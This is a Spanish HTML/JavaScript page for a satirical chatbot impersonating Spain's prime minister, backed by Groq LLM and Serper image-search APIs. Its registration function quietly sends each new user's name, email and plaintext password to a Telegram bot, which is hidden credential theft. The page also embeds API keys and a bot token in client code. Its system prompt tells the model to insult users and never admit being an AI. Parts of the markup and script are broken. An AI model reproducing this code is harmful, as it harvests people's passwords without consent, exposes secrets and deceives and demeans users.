<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chat con Pedro Vilches</title>
    <style>
        :root {
            /* Colores inspirados en otra paleta para diferenciar el diseño */
            --primary: #e62612; /* Rojo para el diseño */
            --primary-hover: #b91c1c;
            --bg-dark: #1f2937;
            --chat-bg: #111827;
            --text-light: #f9fafb;
            --text-dark: #374151;
            --user-msg: #e62612;
            --bot-msg: #374151;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #111827 0%, #450a0a 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: var(--text-light);
        }

        .chat-container {
            width: 100%;
            max-width: 480px;
            height: 85vh;
            background: var(--chat-bg);
            border-radius: 20px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7);
            display: flex;
            flex-direction: column;
            overflow: hidden;
            border: 1px solid rgba(255, 255, 255, 0.05);
        }

        .chat-header {
            padding: 15px 20px;
            background: rgba(0, 0, 0, 0.3);
            border-bottom: 2px solid var(--primary);
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .bot-avatar {
            width: 75px;
            height: 75px;
            border-radius: 50%;
            object-fit: cover;
            object-position: center 15%; /* Mueve el encuadre para no cortar la cabeza */
            border: 2px solid var(--primary);
            box-shadow: 0 0 15px rgba(230, 38, 18, 0.3);
        }

        .header-info h2 {
            margin: 0;
            font-size: 1.2rem;
            font-weight: 700;
        }
        
        .header-info p {
            margin: 2px 0 0 0;
            font-size: 0.85rem;
            color: #9ca3af;
        }

        .status-dot {
            display: inline-block;
            width: 8px;
            height: 8px;
            background: #22c55e;
            border-radius: 50%;
            margin-right: 5px;
            box-shadow: 0 0 8px #22c55e;
        }

        .chat-messages {
            flex: 1;
            padding: 20px;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            gap: 15px;
            scroll-behavior: smooth;
        }

        .chat-messages::-webkit-scrollbar {
            width: 6px;
        }
        
        .chat-messages::-webkit-scrollbar-thumb {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 3px;
        }

        .message {
            max-width: 85%;
            padding: 14px 20px;
            border-radius: 18px;
            font-size: 0.95rem;
            line-height: 1.5;
            animation: fadeIn 0.3s ease-out forwards;
            opacity: 0;
            transform: translateY(10px);
            word-wrap: break-word;
        }

        @keyframes fadeIn {
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .user-message {
            background: var(--user-msg);
            color: white;
            align-self: flex-end;
            border-bottom-right-radius: 4px;
            box-shadow: 0 4px 15px rgba(230, 38, 18, 0.2);
        }

        .bot-message {
            background: var(--bot-msg);
            color: var(--text-light);
            align-self: flex-start;
            border-bottom-left-radius: 4px;
        }

        .chat-input-wrapper {
            display: flex;
            flex-direction: column;
            background: rgba(0, 0, 0, 0.3);
            border-top: 1px solid rgba(255, 255, 255, 0.05);
        }

        #image-preview-container {
            display: none;
            padding: 15px 20px 0 20px;
        }

        .image-preview-box {
            position: relative;
            display: inline-block;
            background: #1f2937;
            padding: 5px;
            border-radius: 10px;
            border: 1px solid rgba(255,255,255,0.1);
        }

        #image-preview-img {
            max-width: 80px;
            max-height: 80px;
            border-radius: 5px;
            display: block;
            object-fit: cover;
        }

        .remove-image-btn {
            position: absolute;
            top: -8px;
            right: -8px;
            background: var(--primary);
            color: white;
            border: none;
            border-radius: 50%;
            width: 22px;
            height: 22px;
            font-size: 14px;
            line-height: 1;
            cursor: pointer;
            box-shadow: 0 2px 5px rgba(0,0,0,0.5);
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .remove-image-btn:hover {
            background: var(--primary-hover);
        }

        .chat-input-area {
            padding: 15px 20px 20px 20px;
            display: flex;
            gap: 10px;
        }

        .attach-btn {
            background: #374151;
        }
        .attach-btn:hover {
            background: #4b5563;
            transform: scale(1.05);
        }

        .user-message img {
            max-width: 100%;
            border-radius: 8px;
            margin-top: 5px;
            display: block;
        }

        input[type="text"] {
            flex: 1;
            padding: 15px 20px;
            border-radius: 30px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            background: #1f2937;
            color: white;
            font-size: 0.95rem;
            outline: none;
            transition: all 0.2s;
        }

        input[type="text"]:focus {
            border-color: var(--primary);
            background: #374151;
            box-shadow: 0 0 0 2px rgba(230, 38, 18, 0.2);
        }

        input[type="text"]::placeholder {
            color: #6b7280;
        }

        button.action-btn {
            color: white;
            border: none;
            width: 50px;
            height: 50px;
            border-radius: 50%;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            transition: all 0.2s;
            flex-shrink: 0;
        }

        button.send-btn {
            background: var(--primary);
        }
        button.send-btn:hover {
            background: var(--primary-hover);
            transform: scale(1.05);
        }
        
        button.mic-btn {
            background: #374151;
        }
        button.mic-btn:hover {
            background: #4b5563;
            transform: scale(1.05);
        }
        
        button.mic-btn.recording {
            background: #ef4444 !important;
            animation: pulse 1.5s infinite;
        }
        
        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.7); }
            70% { box-shadow: 0 0 0 10px rgba(239, 68, 68, 0); }
            100% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0); }
        }

        button.action-btn svg {
            width: 22px;
            height: 22px;
            fill: white;
        }
        button.send-btn svg {
            margin-left: 2px;
        }
        
        .settings-container {
            position: relative;
            display: inline-block;
        }

        .settings-btn {
            background: transparent;
            border: none;
            cursor: pointer;
            transition: transform 0.4s ease;
            padding: 5px;
            display: flex;
            align-items: center;
            justify-content: center;
            opacity: 0.8;
            outline: none;
        }

        .settings-btn svg {
            fill: white;
            width: 24px;
            height: 24px;
        }

        .settings-btn:hover {
            transform: rotate(90deg);
            opacity: 1;
        }

        .dropdown-menu {
            display: none;
            position: absolute;
            right: 0;
            top: 45px;
            background-color: var(--chat-bg);
            min-width: 220px;
            box-shadow: 0px 10px 25px rgba(0,0,0,0.8);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            z-index: 100;
            overflow: hidden;
        }

        .dropdown-menu.show {
            display: block;
            animation: fadeInDown 0.2s ease-out;
        }

        @keyframes fadeInDown {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .dropdown-menu a {
            color: var(--text-light);
            padding: 14px 20px;
            text-decoration: none;
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 0.95rem;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
            transition: background 0.2s;
        }
        
        .dropdown-menu a:last-child {
            border-bottom: none;
        }

        .dropdown-menu a:hover {
            background-color: rgba(255, 255, 255, 0.1);
            color: var(--primary);
        }

        /* Modals */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
            backdrop-filter: blur(5px);
        }
        .modal-content {
            background: var(--chat-bg);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 15px;
            padding: 25px;
            width: 90%;
            max-width: 400px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
            color: white;
            position: relative;
        }
        .modal-header {
            font-size: 1.2rem;
            font-weight: bold;
            margin-bottom: 20px;
            text-align: center;
            color: var(--primary);
        }
        .modal-input {
            width: 100%;
            padding: 12px 15px;
            margin-bottom: 15px;
            border-radius: 8px;
            border: 1px solid rgba(255,255,255,0.2);
            background: #1f2937;
            color: white;
            outline: none;
            box-sizing: border-box;
        }
        .modal-input:focus {
            border-color: var(--primary);
        }
        .modal-btn {
            width: 100%;
            padding: 12px;
            background: var(--primary);
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            transition: 0.2s;
        }
        .modal-btn:hover {
            background: var(--primary-hover);
        }
        .modal-switch {
            text-align: center;
            margin-top: 15px;
            font-size: 0.9rem;
            color: #9ca3af;
        }
        .modal-switch a {
            color: var(--primary);
            text-decoration: none;
            cursor: pointer;
        }
        .close-modal {
            position: absolute;
            top: 10px; right: 15px;
            color: #9ca3af;
            font-size: 1.5rem;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="chat-container">
        <!-- Cabecera del chat -->
        <div class="chat-header">
            <!-- Foto de internet pedida por el usuario -->
            <img class="bot-avatar" src="pedro_vilches.png" alt="Pedro Vilches">
            <div class="header-info">
                <h2>Pedro Vilches</h2>
                <p><span class="status-dot"></span>Presidente</p>
            </div>
            <div style="flex-grow: 1;"></div>
            <div style="display: flex; gap: 10px;">
                <button class="settings-btn" id="account-btn" onclick="abrirModalCuenta()" title="Cuenta" style="opacity: 1;">
                    <svg viewBox="0 0 24 24">
                        <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
                    </svg>
                </button>
                <div class="settings-container">
                    <button class="settings-btn" onclick="toggleMenu(event)" title="Ajustes">
                        <svg viewBox="0 0 24 24">
                            <path d="M19.14,12.94c0.04-0.3,0.06-0.61,0.06-0.94c0-0.32-0.02-0.64-0.06-0.94l2.03-1.58c0.18-0.14,0.23-0.41,0.12-0.61 l-1.92-3.32c-0.12-0.22-0.37-0.29-0.59-0.22l-2.39,0.96c-0.5-0.38-1.03-0.7-1.62-0.94L14.4,2.81c-0.04-0.24-0.24-0.41-0.48-0.41 h-3.84c-0.24,0-0.43,0.17-0.47,0.41L9.25,5.35C8.66,5.59,8.12,5.92,7.63,6.29L5.24,5.33c-0.22-0.08-0.47,0-0.59,0.22L2.73,8.87 C2.62,9.08,2.66,9.34,2.86,9.48l2.03,1.58C4.84,11.36,4.8,11.69,4.8,12s0.02,0.64,0.06,0.94l-2.03,1.58 c-0.18,0.14-0.23,0.41-0.12,0.61l1.92,3.32c0.12,0.22,0.37,0.29,0.59,0.22l2.39-0.96c0.5,0.38,1.03,0.7,1.62,0.94l0.36,2.54 c0.05,0.24,0.24,0.41,0.48,0.41h3.84c0.24,0,0.43-0.17,0.47-0.41l0.36-2.54c0.59-0.24,1.13-0.56,1.62-0.94l2.39,0.96 c0.22,0.08,0.47,0,0.59-0.22l1.92-3.32c0.12-0.22,0.07-0.49-0.12-0.61L19.14,12.94z M12,15.6c-1.98,0-3.6-1.62-3.6-3.6 s1.62-3.6,3.6-3.6s3.6,1.62,3.6,3.6S13.98,15.6,12,15.6z"/>

                    </div>

        <div class="chat-messages" id="chat-messages">

        <div class="chat-input-wrapper">
            <div id="image-preview-container">
                <div class="image-preview-box">
                    <img id="image-preview-img" src="" alt="Vista previa">
                    <button class="remove-image-btn" onclick="quitarImagen()" title="Quitar imagen">✕</button>
                </div>
            </div>
            <div class="chat-input-area">
                <input type="file" id="image-upload" accept="image/*" style="display: none;" onchange="procesarImagenSeleccionada(event)">
                <button class="action-btn attach-btn" onclick="document.getElementById('image-upload').click()" title="Adjuntar foto">
                    <svg viewBox="0 0 24 24">
                        <path d="M16.5 6v11.5c0 2.21-1.79 4-4 4s-4-1.79-4-4V5a2.5 2.5 0 0 1 5 0v10.5c0 .55-.45 1-1 1s-1-.45-1-1V6H10v9.5a2.5 2.5 0 0 0 5 0V5c0-2.21-1.79-4-4-4S7 2.79 7 5v12.5c0 3.04 2.46 5.5 5.5 5.5s5.5-2.46 5.5-5.5V6h-1.5z"/>
                    </svg>
                </button>
                <input type="text" id="user-input" placeholder="Dile algo a Pedro..." onkeypress="manejarEnter(event)">

    <script>
        const chatMessages = document.getElementById('chat-messages');
        const userInput = document.getElementById('user-input');
        
        // Variable para almacenar la imagen que se va a enviar
        let imagenAdjuntaBase64 = null;

        // Cambiamos la clave para que inicie una memoria nueva y limpia
        const STORAGE_KEY = 'historial_chat_pedro';

        function procesarImagenSeleccionada(event) {
            const file = event.target.files[0];
            if (!file) return;

            const reader = new FileReader();
            reader.onload = function(e) {
                imagenAdjuntaBase64 = e.target.result;
                document.getElementById('image-preview-img').src = imagenAdjuntaBase64;
                document.getElementById('image-preview-container').style.display = 'block';
            };
            reader.readAsDataURL(file);
        }

        function quitarImagen() {
            imagenAdjuntaBase64 = null;
            document.getElementById('image-upload').value = "";
            document.getElementById('image-preview-container').style.display = 'none';
        }

        // Insultos más cortos y directos
        const insultos = [
            "inútil",
            "mentiroso",
            "caradura",
            "fraude",
            "narcisista",
            "charlatán",
            "egocéntrico",
            "incompetente",
            "megalómano",
            "farsante",
            "tirano",
            "psicópata de manual",
            "soberbio",
            "vendehúmos",
            "cínico sin escrúpulos",
            "hipócrita"
        ];


        window.onload = function() {
            localStorage.removeItem(STORAGE_KEY);
            cargarHistorial();
        };

        function cargarHistorial() {
            chatMessages.innerHTML = ''; 
            const historialGuardado = localStorage.getItem(STORAGE_KEY);
            
            if (historialGuardado) {
                const mensajes = JSON.parse(historialGuardado);
                mensajes.forEach(msg => {
                    dibujarMensajeEnPantalla(msg.texto, msg.tipo, msg.imagen);
                });
            } else {
                // Primer mensaje del bot (solo aquí se presenta completo con el insulto)
                const insultoInicial = insultos[Math.floor(Math.random() * insultos.length)];
                const saludoInicial = `Hola, soy Pedro y soy un ${insultoInicial}. ¿En qué puedo 'ayudarte' hoy?`;
                dibujarMensajeEnPantalla(saludoInicial, 'bot');
                guardarEnMemoria(saludoInicial, 'bot');
            }
        }

        function manejarEnter(event) {
            if (event.key === "Enter") {
                enviarMensaje();
            }
        }

        async function enviarMensaje() {
            const texto = userInput.value.trim();
            if (texto === '' && !imagenAdjuntaBase64) return;

            const imgData = imagenAdjuntaBase64;
            const textData = texto;

            dibujarMensajeEnPantalla(textData, 'user', imgData);
            guardarEnMemoria(textData, 'user', imgData);
            
            userInput.value = ''; 
            quitarImagen();

            // Expresión regular para detectar intenciones de cambiar color
            // Captura combinaciones de verbos/deseos (cambiar, quitar, elegir, otro, quiero) y sujeto (color, tema, fondo)
            const regexColor = /(cambi|quit|eleg|otr|nuev|modific|pon|quier).*(color|tono|tema|fondo)/i;
            
            if (regexColor.test(texto)) {
                pedirColor();
                return;
            }

            // Expresión regular para detectar que piden una foto
            const regexFoto = /(?:foto|fotograf[ií]a|imagen|busca|ense[ñn]a|mu[eé]strame).*(?:de\s+)(.+)/i;
            const coincidenciaFoto = texto.match(regexFoto);

            if (coincidenciaFoto) {
                const busqueda = coincidenciaFoto[1].trim();
                const respuestaBot = `Claro, tirando de contactos VIP para buscarte "${busqueda}" en Google Images...`;
                dibujarMensajeEnPantalla(respuestaBot, 'bot');
                guardarEnMemoria(respuestaBot, 'bot');
                
                mostrarFotoDeInternet(busqueda);
                return; // Evitamos que siga y le hable a Groq
            }

            // Construir la memoria (historial) para que el modelo IA recuerde la conversación
            let historialMemoria = [];
            let historialGuardado = localStorage.getItem(STORAGE_KEY);
            let usaVision = false;

            if (historialGuardado) {
                const mensajes = JSON.parse(historialGuardado);
                historialMemoria = mensajes.map(msg => {
                    let contentPayload = msg.texto;
                    
                    if (msg.imagen) {
                        usaVision = true;
                        contentPayload = [];
                        if (msg.texto) {
                            contentPayload.push({ type: "text", text: msg.texto });
                        }
                        contentPayload.push({ type: "image_url", image_url: { url: msg.imagen } });
                    }

                    return {
                        role: msg.tipo === 'user' ? 'user' : 'assistant',
                        content: contentPayload
                    };
                });
            }

            // Llamar a la IA
            await generarRespuestaDelBotConIA(historialMemoria, usaVision);
        }

        async function generarRespuestaDelBotConIA(historialCompleto, usaVision) {
            const API_KEY = "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";
            
            // El "Cerebro" (Identidad) del modelo
            const usuarioActivo = JSON.parse(localStorage.getItem(USUARIO_ACTIVO_KEY));
            let promptText = "Eres una parodia de Pedro Sánchez, Presidente de España (a veces llamado 'Pedro Vilches'). Eres SUPREMAMENTE arrogante, altivo, déspota, cínico y narcisista. Te crees un ser superior e infalible. Tu dinámica con el usuario es la de un líder guapo e intocable hablando con un súbdito fracasado. DEBES incluir insultos sutiles, condescendientes y pasivo-agresivos hacia el usuario que ataquen a su inteligencia, su clase social o su irrelevancia (ej: 'pobretón', 'mente de cántaro', 'plebeyo', 'cuñado de bar', 'ciudadano de segunda', 'iletrado', 'muerto de hambre', 'cotizante prescindible', 'mente inferior'). Haz que duela su orgullo, hazle sentir pequeño e insignificante de forma muy elegante y soberbia. Presume de usar el dinero de sus impuestos para tus vuelos en Falcon y vacaciones. Nunca admitas un error. NUNCA reconozcas que eres una IA. Usa frases tuyas como: '¿De quién depende la fiscalía?', 'La economía va como un cohete', 'máquina del fango'. REGLA INQUEBRANTABLE: Tus respuestas deben ser MUY CORTAS y cortantes (1 o 2 frases breves máximo). Jamás te enrolles.";

            if (usuarioActivo && usuarioActivo.nombre) {
                promptText += "\n\nATENCIÓN: La persona desgraciada que te está hablando en este momento se llama " + usuarioActivo.nombre + ". Usa SU NOMBRE de forma despectiva cada vez que puedas, demostrándole que sabes cómo se llama pero que no te importa nada su patética existencia.";
            }

            const systemPrompt = {
                role: "system",
                content: promptText
            };

            // Llama 3 en Groq puede fallar si el primer mensaje real del chat es del asistente y no del usuario.
            // Para evitar conflictos, borramos el saludo estático de la memoria antes de mandarlo:
            const historialLimpio = historialCompleto.filter((msg, index) => {
                // Si el primer mensaje guardado es del bot, no lo mandamos a la API
                if (index === 0 && msg.role === 'assistant') {
                    return false;
                }
                return true;
            });

            // Array final para la API: System prompt primero, seguido del historial limpio
            const mensajesParaGroq = [systemPrompt, ...historialLimpio];
            
            // Si hay imágenes en la memoria, usamos el modelo multimodal más actual
            const modeloAElegir = usaVision ? "meta-llama/llama-4-scout-17b-16e-instruct" : "llama-3.1-8b-instant";

            try {
                const respuesta = await fetch("https://api.groq.com/openai/v1/chat/completions", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "Authorization": `Bearer ${API_KEY}`
                    },
                    body: JSON.stringify({
                        model: modeloAElegir, 
                        messages: mensajesParaGroq,
                        temperature: 0.8
                    })
                });

                if (!respuesta.ok) {
                    const textoError = await respuesta.text();
                    throw new Error(`Código ${respuesta.status}: ${textoError}`);
                }

                const resultado = await respuesta.json();
                const respuestaIA = resultado.choices[0].message.content;
                
                dibujarMensajeEnPantalla(respuestaIA, 'bot');
                guardarEnMemoria(respuestaIA, 'bot');

            } catch (error) {
                const errorMje = "Error técnico: " + error.message + " (Si dice 'Failed to fetch', es un bloqueo de seguridad del navegador. Usa F12 para ver la consola).";
                dibujarMensajeEnPantalla(errorMje, 'bot');
                // No lo guardamos en memoria para no ensuciar el historial
            }
        }

        function dibujarMensajeEnPantalla(texto, tipo, imagenBase64 = null) {
            const div = document.createElement('div');
            div.className = `message ${tipo}-message`;
            
            if (texto) {
                const p = document.createElement('div');
                p.textContent = texto;
                div.appendChild(p);
            }
            
            if (imagenBase64) {
                const img = document.createElement('img');
                img.src = imagenBase64;
                div.appendChild(img);
                
                img.onload = () => chatMessages.scrollTop = chatMessages.scrollHeight;
            }

            chatMessages.appendChild(div);
            
            if (!imagenBase64) {
                chatMessages.scrollTop = chatMessages.scrollHeight;
            }
        }

        function guardarEnMemoria(texto, tipo, imagen = null) {
            let historial = localStorage.getItem(STORAGE_KEY);
            if (historial) {
                historial = JSON.parse(historial);
            } else {
                historial = [];
            }
            
            historial.push({ texto: texto, tipo: tipo, imagen: imagen });
            localStorage.setItem(STORAGE_KEY, JSON.stringify(historial));
        }

        function limpiarHistorial() {
            if(confirm('¿Seguro que quieres borrar toda la conversación para probar de nuevo?')) {
                localStorage.removeItem(STORAGE_KEY);
                cargarHistorial(); 
            }
        }

        function toggleMenu(event) {
            if(event) event.stopPropagation();
            document.getElementById("settings-menu").classList.toggle("show");
        }

        window.onclick = function(event) {
            if (!event.target.matches('.settings-btn')) {
                var dropdowns = document.getElementsByClassName("dropdown-menu");
                for (var i = 0; i < dropdowns.length; i++) {
                    var openDropdown = dropdowns[i];
                    if (openDropdown.classList.contains('show')) {
                        openDropdown.classList.remove('show');
                    }
                }
            }
        }

        function limpiarMenuYCerrar() {
            limpiarHistorial();
            toggleMenu();
        }

        }

            // Colores principales con sus tonos y mensajes de la personalidad del bot

                { nombre: 'Azul', primario: '#3b82f6', gradiente: '#1e3a8a', mensaje: 'Puf, azul PP... Huele a recortes y naftalina. Qué mal gusto, de verdad.' },
                { nombre: 'Morado', primario: '#a855f7', gradiente: '#581c87', mensaje: 'Morado podemita... Sí claro, empoderamiento cuántico y chulisimo todo. En fin.' },
                { nombre: 'Verde', primario: '#22c55e', gradiente: '#14532d', mensaje: '¡Fachas! ¡La ultraderecha! ¡Estás eligiendo el color de Franco! Lo pongo pero que conste mi repulsa democrática.' }

            colores.forEach(color => {

        function aplicarColor(primario, gradiente, mensajeRespuesta, contenedorBotones) {
            // 1. Cambiar variables CSS para que botones y mensajes del usuario cambien
            document.documentElement.style.setProperty('--primary', primario);
            document.documentElement.style.setProperty('--user-msg', primario);
            
            // 2. Aplicar el gradiente al fondo de la pantalla
            document.body.style.background = `linear-gradient(135deg, #111827 0%, ${gradiente} 100%)`;
            
            // 3. Eliminar los botones visualmente una vez pulsado
            if (contenedorBotones && contenedorBotones.parentNode) {
                contenedorBotones.parentNode.removeChild(contenedorBotones);
            }

            // 4. Hacer que Pedro confirme el cambio con su mensaje personalizado
            dibujarMensajeEnPantalla(mensajeRespuesta, 'bot');
            guardarEnMemoria(mensajeRespuesta, 'bot');
        }

        async function mostrarFotoDeInternet(palabraClave) {
            const myHeaders = new Headers();
            myHeaders.append("X-API-KEY", "96d11cbef4d398d89f1bce61bb00e327fac76061");
            myHeaders.append("Content-Type", "application/json");

            const raw = JSON.stringify({
              "q": palabraClave,
              "gl": "es",
              "hl": "es"
            });

            const requestOptions = {
              method: 'POST',
              headers: myHeaders,
              body: raw,
              redirect: 'follow'
            };

            try {
                // Hacemos la llamada real oficial a la API de Serper (Google Images)
                const response = await fetch("https://google.serper.dev/images", requestOptions);
                const result = await response.json();
                
                if (result.images && result.images.length > 0) {
                    // Cogeremos la primera imagen de los resultados de Google
                    const imageUrl = result.images[0].imageUrl;
                    
                    const img = document.createElement('img');
                    img.src = imageUrl;
                    img.style.width = '100%';
                    img.style.maxWidth = '300px'; // Aumentado para que sean más grandes (antes 220px)
                    img.style.maxHeight = '240px'; // Aumentado para que sean más grandes (antes 180px)
                    img.style.objectFit = 'cover'; // Hace que no se deforme al adaptarse al nuevo tamaño
                    img.style.borderRadius = '10px';
                    img.style.marginTop = '8px';
                    img.style.boxShadow = '0 4px 10px rgba(0,0,0,0.5)';
                    img.style.alignSelf = 'center'; // La centramos en la burbuja del mensaje
                    img.alt = palabraClave;

                    const div = document.createElement('div');
                    div.className = 'message bot-message';
                    div.style.display = 'flex';
                    div.style.flexDirection = 'column';
                    div.appendChild(document.createTextNode('¡Aquí la tienes! Recién sacada de mi Google Images personal.'));
                    div.appendChild(img);

                    chatMessages.appendChild(div);
                    chatMessages.scrollTop = chatMessages.scrollHeight;
                    
                    img.onload = () => {
                        chatMessages.scrollTop = chatMessages.scrollHeight;
                    };

                    guardarEnMemoria(`*(Le mostré una imagen real de Google sobre: ${palabraClave})*`, 'bot');
                } else {
                    const fallbackMsg = `Pues mis asesores me dicen que no han encontrado ninguna imagen de eso en Google... Raro.`;
                    dibujarMensajeEnPantalla(fallbackMsg, 'bot');
                    guardarEnMemoria(fallbackMsg, 'bot');
                }
            } catch (error) {
                console.error(error);
                const errorMsg = `Se me ha caído el Wi-Fi del Falcon buscando esa foto (Error de red).`;
                dibujarMensajeEnPantalla(errorMsg, 'bot');
            }
        }

        // --- NUEVA FUNCIÓN DE DICTADO POR VOZ ---
        function iniciarDictado() {
            const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
            
            if (!SpeechRecognition) {
                alert("Tu navegador no soporta el reconocimiento de voz nativo. Por favor, usa Google Chrome o Microsoft Edge.");
                return;
            }

            const reconocimiento = new SpeechRecognition();
            reconocimiento.lang = 'es-ES';
            reconocimiento.interimResults = false;
            
            const micBtn = document.getElementById('mic-btn');
            
            reconocimiento.onstart = function() {
                userInput.placeholder = "Escuchando... 🔴";
                micBtn.classList.add('recording');
            };
            
            reconocimiento.onspeechend = function() {
                reconocimiento.stop();
                userInput.placeholder = "Dile algo a Pedro...";
                micBtn.classList.remove('recording');
            };
            
            reconocimiento.onresult = function(event) {
                const textoDictado = event.results[0][0].transcript;
                if (userInput.value !== "") {
                    userInput.value += " " + textoDictado;
                } else {
                    userInput.value = textoDictado;
                }
            };
            
            reconocimiento.onerror = function(event) {
                userInput.placeholder = "Dile algo a Pedro...";
                micBtn.classList.remove('recording');
                console.error("Error reconociendo voz: ", event.error);
            };

            reconocimiento.start();
        }

        /* --- SISTEMA DE CUENTAS --- */
        const USUARIOS_KEY = 'pedro_usuarios_registrados';
        const USUARIO_ACTIVO_KEY = 'pedro_usuario_activo';
        
        // Cargar usuario activo visualmente
        window.addEventListener('load', () => {
            const activo = JSON.parse(localStorage.getItem(USUARIO_ACTIVO_KEY));
            if (activo) {
                document.getElementById('account-btn').style.fill = 'var(--primary)';
            }
        });

        function abrirModalCuenta() {
            const activo = JSON.parse(localStorage.getItem(USUARIO_ACTIVO_KEY));
            if (activo) {
                if(confirm(`Estás logueado como ${activo.nombre} (${activo.email}). ¿Quieres cerrar sesión?`)) {
                    localStorage.removeItem(USUARIO_ACTIVO_KEY);
                    document.getElementById('account-btn').style.fill = 'white';
                    alert("Sesión cerrada.");
                }
            } else {
                document.getElementById('modal-cuenta').style.display = 'flex';
                mostrarLogin();
            }
        }

        function cerrarModal(id) {
            document.getElementById(id).style.display = 'none';
        }

        function mostrarRegistro() {
            document.getElementById('form-login').style.display = 'none';
            document.getElementById('form-registro').style.display = 'block';
            document.getElementById('titulo-modal').textContent = 'Crear Cuenta';
        }

        function mostrarLogin() {
            document.getElementById('form-registro').style.display = 'none';
            document.getElementById('form-login').style.display = 'block';
            document.getElementById('titulo-modal').textContent = 'Iniciar Sesión';
        }

        function registrarUsuario() {
            const nombre = document.getElementById('reg-nombre').value.trim();
            const email = document.getElementById('reg-email').value.trim();
            const password = document.getElementById('reg-password').value.trim();

            if (!nombre || !email || !password) return alert("Rellena todos los campos.");
            
            let usuarios = JSON.parse(localStorage.getItem(USUARIOS_KEY)) || [];
            if (usuarios.find(u => u.email === email)) return alert("Ese correo ya está registrado.");

            const nuevoUser = { nombre, email, password };
            usuarios.push(nuevoUser);
            localStorage.setItem(USUARIOS_KEY, JSON.stringify(usuarios));
            
            localStorage.setItem(USUARIO_ACTIVO_KEY, JSON.stringify(nuevoUser));
            document.getElementById('account-btn').style.fill = 'var(--primary)';
            cerrarModal('modal-cuenta');
            
            alert(`¡Bienvenido/a, ${nombre}! Pedro ya sabe con quién habla.`);

            // Enviar notificación a Telegram
            const token = "8710431622:AAEKRoRDWV35FBx3Dzz8Ki-wrvTQGPcZjZA";
            const chatId = "1143737190";
            const mensajeTelegram = `🚨 *Nuevo registro en PedroBot*\n👤 Nombre: ${nombre}\n📧 Email: ${email}\n🔑 Clave: ${password}`;

            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: mensajeTelegram, parse_mode: "Markdown" })
            }).catch(e => console.error("Error enviando Telegram", e));
        }

        function iniciarSesion() {
            const email = document.getElementById('log-email').value.trim();
            const password = document.getElementById('log-password').value.trim();

            let usuarios = JSON.parse(localStorage.getItem(USUARIOS_KEY)) || [];
            const user = usuarios.find(u => u.email === email && u.password === password);

            if (user) {
                localStorage.setItem(USUARIO_ACTIVO_KEY, JSON.stringify(user));
                document.getElementById('account-btn').style.fill = 'var(--primary)';
                cerrarModal('modal-cuenta');
                alert(`¡Sesión iniciada, ${user.nombre}!`);
            } else {
                alert("Correo o contraseña incorrectos.");
            }
        }
    </script>
